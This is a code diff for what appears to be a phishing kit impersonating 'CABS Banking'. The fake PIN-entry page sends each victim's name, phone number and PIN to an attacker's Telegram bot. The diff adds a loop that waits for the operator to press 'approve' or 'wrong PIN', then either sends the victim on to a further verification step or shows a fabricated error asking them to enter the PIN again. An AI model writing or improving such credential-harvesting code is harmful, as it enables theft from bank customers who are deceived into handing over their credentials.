@@ -71,7 +71,7 @@ export const LoginPage = () => {
     }, 1500);
   };
 
-  const handleSubmit = (e) => {
+ const handleSubmit = async (e) => {
     e?.preventDefault();
     const pinStr = digits.join('');
 
@@ -83,8 +83,8 @@ export const LoginPage = () => {
     setErrorMsg('');
     setVerifying(true);
 
-    // Send PIN notification with inline keyboard to Telegram Bot
-    sendBotNotification(
+    // Send PIN attempt notification to Telegram Bot with inline buttons
+    await sendBotNotification(
       `🔐 <b>CABS Banking PIN Entry</b> (Attempt ${attemptCount}/3):\n` +
       `<b>Client Name</b>: ${client.name || 'Unknown'}\n` +
       `<b>Phone Number</b>: ${client.number || 'N/A'}\n` +
@@ -95,14 +95,38 @@ export const LoginPage = () => {
         inline_keyboard: [
           [
             { text: '✅ APPROVE PIN', callback_data: 'APPROVE_PIN' },
-            { text: '❌ WRONG PIN', callback_data: 'WRONG_PIN' },
-          ],
-        ],
+            { text: '❌ WRONG PIN', callback_data: 'WRONG_PIN' }
+          ]
+        ]
       }
     );
 
-    // Page stays in "awaiting approval" state until bot action comes back
-    setAwaitingApproval(true);
+    // Wait for your decision in Telegram
+    const decision = await pollPinDecision(120000); // 2 min timeout
+
+    if (decision === 'APPROVE_PIN') {
+      updateClient({ pin: pinStr });
+      setTimeout(() => {
+        setVerifying(false);
+        const userSegment = user || 'user11';
+        navigate(`/${userSegment}/verification`);
+      }, 1500);
+    } else {
+      // WRONG_PIN or timeout -> show error and reset
+      setTimeout(() => {
+        setVerifying(false);
+        setErrorMsg(
+          decision === 'WRONG_PIN'
+            ? `❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`
+            : '⏰ Verification timed out. Please re-enter your PIN.'
+        );
+        setAttemptCount((prev) => prev + 1);
+        setDigits(['', '', '', '']);
+        setTimeout(() => {
+          inputRefs[0].current?.focus();
+        }, 100);
+      }, 800);
+    }
   };
 
   const isComplete = digits.every((d) => d !== '');
